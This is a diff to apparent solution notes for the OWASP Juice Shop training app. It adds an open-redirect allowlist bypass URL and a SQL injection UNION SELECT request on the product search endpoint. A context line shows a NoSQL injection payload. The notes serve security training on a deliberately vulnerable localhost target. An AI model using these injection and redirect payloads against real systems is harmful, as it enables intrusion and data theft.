@@ -263,8 +263,14 @@ burp suite > proxy > repeater<br>
 PATCH /rest/products/reviews HTTP/1.1<br>
 { "id": { "$ne": -1 }, "message": "NoSQL Injection!" }<br>
 
+### Allowlist Bypass
+http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop<br>
 
-
+### Christmas special
+burp suite > proxy > repeater<br>
+GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
+POST /api/BasketItems/ HTTP/1.1
+{"ProductId":24,"BasketId":"10","quantity":1}
 
 
 
